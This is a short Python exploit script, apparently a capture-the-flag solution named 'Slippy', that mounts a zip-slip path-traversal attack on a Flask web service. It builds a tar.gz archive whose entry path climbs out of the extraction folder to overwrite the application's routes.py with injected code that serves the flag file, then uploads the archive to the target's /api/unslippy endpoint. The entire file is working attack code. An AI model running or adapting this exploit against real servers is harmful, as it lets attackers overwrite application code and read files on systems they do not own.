import tarfile
import io
import time
import requests
import sys

if len(sys.argv) != 2:
    print("Usage: python3 Slippy.py ip:port")
    sys.exit(1)

target = sys.argv[1]
upload_url = f"http://{target}/api/unslippy"

payload = '''
from flask import Blueprint
web = Blueprint('web', __name__)
api = Blueprint('api', __name__)
@web.route('/')
def flag():
    return open('/app/flag').read()
'''

zipslip = io.BytesIO()
tar = tarfile.open(fileobj=zipslip, mode='w:gz')

info = tarfile.TarInfo(name='../app/application/blueprints/routes.py')
info.size = len(payload)
info.mtime = time.time()

tar.addfile(info, io.BytesIO(payload.encode()))
tar.close()
zipslip.seek(0)

print("Uploading arcive")

files = {
    'file': ('exploit.tar.gz', zipslip, 'application/gzip')
}

response = requests.post(upload_url, files=files)

if response.status_code != 200:
    print("Upload failed:", response.status_code)
    print(response.text)
    sys.exit(1)

print("Archive uploaded successfully, please refresh page to recive flag")